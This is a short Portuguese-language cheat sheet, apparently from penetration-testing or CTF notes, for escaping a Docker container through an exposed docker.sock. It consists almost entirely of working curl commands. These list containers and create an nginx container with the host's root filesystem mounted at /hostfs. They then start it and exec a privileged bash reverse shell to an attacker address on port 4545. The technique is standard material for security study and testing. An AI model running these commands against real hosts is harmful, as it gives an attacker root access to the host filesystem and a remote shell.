Listar os contêineres:
```sh
$ curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
```

Agora que sabemos os contêineres que existem, podemos criar algum (`nginx:latest`) e mapear o sistema de arquivo do host em `hostfs`. Este comando irá retornar um `id`
```sh
curl -i -s -k -X POST -H 'Content-Type: application/json' --data-binary '{"Hostname": "","Domainname": "","User": "","AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Tty": true,"OpenStdin": true,"StdinOnce": true,"Entrypoint": "/bin/bash","Image": "nginx:latest","Volumes": {"/hostfs/": {}},"HostConfig": {"Binds": ["/:/hostfs"]}}' http://localhost/containers/create --unix-socket /var/run/docker.sock
```

Agora iremos iniciar o container utilizando o id que obtivemos:
```sh
curl -X POST --unix-socket /run/docker.sock http://localhost/containers/<container_id>/start
```

Podemos especificar um comando para ser executado, estaremos passando uma reverse shell:
```sh
curl -i -s -X POST -H "Content-Type: application/json" --data-binary '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["/bin/bash", "-c", "bash -i >& /dev/tcp/<ip-vpn>/4545 0>&1"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}' http://localhost/containers/<container_id>/exec --unix-socket /var/run/docker.sock
```

Com o id que obtivemos, teremos que usar na seguinte requisição
```sh
curl -i -s -X POST -H 'Content-Type: application/json' --data-binary '{"Detach": false,"Tty": false}' http://localhost/exec/<EXEC-ID>/start --unix-socket /run/docker.sock
```

#### Referência
https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket


